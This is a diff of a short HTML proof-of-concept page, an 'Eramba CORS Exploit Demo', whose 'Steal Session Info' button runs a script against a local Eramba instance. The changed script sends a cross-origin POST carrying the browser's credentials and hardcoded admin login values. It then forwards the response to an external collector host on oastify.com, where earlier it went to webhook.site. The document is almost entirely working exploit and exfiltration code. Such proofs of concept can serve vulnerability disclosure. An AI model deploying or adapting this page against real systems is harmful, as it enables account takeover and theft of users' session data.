@@ -5,28 +5,35 @@
 </head>
 <body>
   <h2>Eramba CORS Exploit Demo</h2>
-  <button onclick="steal()">Steal Session Info</button>
+  <button onclick="exploit()">Steal Session Info</button>
 
   <script>
-    function steal() {
-      fetch("https://localhost:8443/system-api/user/me", {
-        method: "GET",
-        credentials: "include"
+    function exploit() {
+      fetch("https://localhost:8443/system-api/login", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: "login=admin&password=admin1234"
       })
       .then(response => response.json())
       .then(data => {
-        console.log("Exfiltrated User Info:", data);
+        console.log("🎯 Exploited Response from Eramba:", data);
 
-        // OPTIONAL: Send it to your server
-        fetch("https://webhook.site/your-id", {
+        // Optional: Exfiltrate to webhook.site or your own collector
+        fetch("https://4bg05un25gp15hcej64jesmhv81zpqdf.oastify.com", {
           method: "POST",
           headers: {
             "Content-Type": "application/json"
           },
           body: JSON.stringify(data)
         });
+
       })
-      .catch(err => console.error("Exploit failed:", err));
+      .catch(error => {
+        console.error("❌ Exploit failed:", error);
+      });
     }
   </script>
 </body>
